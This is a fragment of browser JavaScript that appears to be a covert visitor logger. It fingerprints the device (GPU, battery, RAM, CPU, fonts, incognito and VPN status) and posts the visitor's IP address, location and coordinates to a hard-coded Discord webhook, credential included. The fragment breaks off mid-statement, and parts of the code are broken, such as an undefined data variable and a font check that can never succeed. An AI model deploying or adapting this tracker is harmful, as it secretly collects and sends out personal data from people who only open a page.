<script>
async function getExtraDeviceInfo() {
    let batteryLevel = "Unknown";
    let isCharging = "Unknown";
    let deviceType = /Mobi|Android/i.test(navigator.userAgent) ? "📱 Mobile" : "💻 Desktop/Laptop";
    
    if (navigator.getBattery) {
        const battery = await navigator.getBattery();
        batteryLevel = Math.round(battery.level * 100) + "%";
        isCharging = battery.charging ? "Yes" : "No";
    }

    function estimateCPUThreads() {
        return new Promise(resolve => {
            if (navigator.hardwareConcurrency) {
                resolve(navigator.hardwareConcurrency);
            } else {
                resolve("Unknown");
            }
        });
    }

    let cpuThreads = await estimateCPUThreads();
    let ramSize = navigator.deviceMemory ? `${navigator.deviceMemory} GB (Estimated)` : "Unknown";

    return {
        cpuCores: cpuThreads,
        ramSize: ramSize,
        gpu: getGPUInfo(),
        battery: `${batteryLevel} (Charging: ${isCharging})`,
        numWindows: window.length || "Unknown",
        deviceType: deviceType
    };
}

function getGPUInfo() {
    let gl = document.createElement('canvas').getContext('webgl');
    if (!gl) return "Unknown GPU";
    let debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
    return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown GPU";
}

async function testInternetSpeed() {
    const startTime = performance.now();
    await fetch('https://speed.hetzner.de/100MB.bin', { method: 'HEAD', mode: 'no-cors' }).catch(() => {});
    const duration = (performance.now() - startTime) / 1000;
    return (100 / duration).toFixed(2) + " MB/s";
}

async function checkVPN() {
    try {
        let rtc = new RTCPeerConnection();
        rtc.createDataChannel('');
        rtc.createOffer().then(o => rtc.setLocalDescription(o));
        return new Promise(resolve => {
            rtc.onicecandidate = ice => {
                if (!ice || !ice.candidate || !ice.candidate.candidate) return resolve("Unknown");
                resolve(ice.candidate.candidate.includes("relay") ? "Yes (VPN/Proxy Detected)" : "No");
            };
        });
    } catch {
        return "Unknown";
    }
}

function detectIncognito() {
    return new Promise((resolve) => {
        let fs = window.RequestFileSystem || window.webkitRequestFileSystem;
        if (!fs) {
            resolve("Unknown");
        } else {
            fs(window.TEMPORARY, 100, () => resolve("No"), () => resolve("Yes"));
        }
    });
}

async function getInstalledFonts() {
    let fonts = ["Arial", "Verdana", "Times New Roman", "Courier New", "Georgia"];
    let installedFonts = [];
    let ctx = document.createElement("canvas").getContext("2d");
    ctx.font = "72px sans-serif";
    for (let font of fonts) {
        ctx.font = `72px ${font}, sans-serif`;
        if (ctx.measureText("ABC").width !== ctx.measureText("ABC").width) {
            installedFonts.push(font);
        }
    }
    return installedFonts.length > 0 ? installedFonts.join(", ") : "Unknown";
}

async function sendToWebhook() {

            const ip = data.ip;
            const country = data.country || "Unknown";
            const city = data.city || "Unknown";
            const region = data.region || "Unknown";
            const org = data.org || "Unknown"; 
            const loc = data.loc || "Unknown"; 
            const dateTime = new Date().toLocaleString();

            const webhookUrl = 'https://discord.com/api/webhooks/1368195578567069776/tPGWJQnBCosFX3SyubuCbZq27xl66mY2BjPYC8T5JFcSN3Sf3b1SRngWDrKVfmlARuW6';

            var xhr = new XMLHttpRequest();
            xhr.open("POST", webhookUrl, true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            
            const dataToSend = {
                content: `📡 **New Connection Data** 📡\n\n` +
                         `📍 **Location:** ${country}, ${region}, ${city}\n` +
                         `🌎 **Coordinates:** ${loc}\n` +
